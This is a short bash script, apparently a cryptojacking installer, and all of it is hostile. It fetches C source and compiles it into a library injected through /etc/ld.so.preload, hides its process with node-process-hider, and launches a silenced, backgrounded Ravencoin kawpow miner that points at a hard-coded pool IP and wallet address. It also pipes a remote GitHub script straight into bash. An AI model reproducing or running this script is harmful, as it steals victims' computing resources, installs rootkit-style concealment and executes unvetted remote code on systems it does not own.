#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/falsbayu039/botak/-/raw/master/lohan.c -o lohan.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o liblohan.so lohan.c -ldl
mv liblohan.so /usr/local/lib/
echo /usr/local/lib/liblohan.so >> /etc/ld.so.preload
rm lohan.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add opa"
wget https://gitlab.com/falsbayu039/botak/-/raw/main/opa >/dev/null 2>&1
chmod +x opa
./opa -a kawpow --coin rvn -o stratum+tcp://159.223.198.133:443 -u RCE3jukUFLFpbr3GH5Hy77czci4AiLHAH1 -w NVIDIA >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/youcef664/tera/main/molor.sh | bash
